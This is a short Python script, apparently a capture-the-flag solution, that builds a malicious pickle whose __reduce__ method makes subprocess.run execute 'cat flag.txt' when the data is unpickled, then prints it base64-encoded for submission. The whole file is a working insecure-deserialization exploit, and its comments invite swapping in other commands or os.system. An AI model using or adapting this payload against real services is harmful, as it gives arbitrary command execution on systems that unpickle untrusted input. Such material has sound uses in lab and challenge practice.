import pickle
import base64
import subprocess

class PWN:
    def __reduce__(self):
        cmd = ('cat', 'flag.txt') # Changed the command to match your specific needs.
        return subprocess.run, (cmd,) # Depending on your needs, you may have to alter this to use os.system or subprocess.check_output. Reference the Python documentation.


if __name__ == '__main__':
    pickled = pickle.dumps(PWN())
    print(base64.urlsafe_b64encode(pickled))
